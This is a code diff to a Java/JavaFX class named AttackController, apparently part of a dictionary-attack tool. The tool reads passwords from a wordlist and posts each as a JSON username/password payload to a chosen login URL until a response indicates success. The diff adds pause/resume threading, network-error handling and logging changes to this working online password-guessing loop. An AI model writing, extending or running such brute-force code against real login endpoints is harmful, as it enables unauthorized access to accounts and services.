@@ -6,6 +6,8 @@ import java.net.URI;
 import java.net.http.HttpClient;
 import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
+import java.util.concurrent.locks.Condition;
+import java.util.concurrent.locks.ReentrantLock;
 import javafx.application.Application;
 import javafx.concurrent.Task;
 import javafx.stage.Stage;
@@ -15,6 +17,12 @@ public class AttackController extends Application{
     private boolean passFound = false;
     private long sec = 0;
     private double obt = 1;
+    private int responseCode = 0;
+    private Task<Void> attackTask;
+    private Thread attackThread;
+    private final ReentrantLock pauseLock = new ReentrantLock();
+    private final Condition unpaused = pauseLock.newCondition();
+    private volatile boolean paused = false;
     @Override 
     public void start(Stage args0){
         DictionaryAttackApp dic = new DictionaryAttackApp();
@@ -23,14 +31,14 @@ public class AttackController extends Application{
 
     //start the engine
     public void start(String path, String username, String url, DictionaryAttackApp dic, long start, boolean term){
-        Task<Void> attackTask = new Task<Void>() {
+        attackTask = new Task<Void>() {
             @Override 
             protected Void call(){
                 runAttack(path, username, url, dic, start, term);
                 return null;
             }
         };
-        Thread attackThread = new Thread(attackTask);
+        attackThread = new Thread(attackTask);
         attackThread.setDaemon(true);
         attackThread.start();
     }
@@ -44,6 +52,7 @@ public class AttackController extends Application{
         HttpClient client = HttpClient.newHttpClient();
 
         while((pass = reader.readLine()) != null && !(term)){
+            checkPaused();
             term = dic.getTerm();
             String jsonPayload = ("{\"username\": \""+username+"\", \"password\": \""+pass+"\"}");
             //Visualizing elapsed time
@@ -62,7 +71,6 @@ public class AttackController extends Application{
                     .build();
             
             //catch a response
-            int responseCode = 0;
             try{
                 HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
                 responseCode = response.statusCode();
@@ -74,6 +82,7 @@ public class AttackController extends Application{
             }
             catch(IOException | InterruptedException e){
                 System.out.println("Network Error");
+                dic.setTerm(true);
             }
             if(obt % 50 == 0){
                 dic.appendLogArea("Status Code = "+ responseCode +"\nPayLoad = "+ jsonPayload+"\n");
@@ -95,10 +104,14 @@ public class AttackController extends Application{
                 dic.setLogArea("");
             }
         }
-        if(passFound){
+        if(!passFound && responseCode == 0){
+            dic.appendLogArea("Network Error");
+            dic.setpassField("Network Error");
+        }else if(passFound){
             dic.setpassField("Pass: "+pass);
             dic.appendLogArea("\nPassword found = "+ pass +"\n");
-        }else{
+        }
+        else{
             dic.setpassField("Password not found!");
             dic.appendLogArea("Password not found!\n");
         }
@@ -108,7 +121,7 @@ public class AttackController extends Application{
         e.printStackTrace();
     }
         double attemptMS = sec > 0 ? obt / sec : 0;
-        attemptMS = Math.round(attemptMS * 1000.0) / 1000.0;
+        attemptMS = Math.round(attemptMS * 10.0) / 10.0;
         dic.setc3Val(attemptMS+"");
     }
     // Counting passwords
@@ -123,5 +136,40 @@ public class AttackController extends Application{
             System.out.println("File not Found!");
         }
         return count;
+    }
+    //setter for paused
+    public void pauseAttack() {
+        paused = true;
+    }
+    //setter for resuming attack
+    public void resumeAttack() {
+
+        pauseLock.lock();
+
+        try {
+            paused = false;
+            unpaused.signalAll();
+        } finally {
+            pauseLock.unlock();
+        }
+    }
+    //checking the pause
+    private void checkPaused() throws InterruptedException {
+
+        pauseLock.lock();
+
+        try {
+
+            while (paused) {
+                unpaused.await();
+            }
+
+        } finally {
+            pauseLock.unlock();
+        }
+    }
+    //setter for obt
+    public void setobt(int n){
+        obt = n;
     }
 }
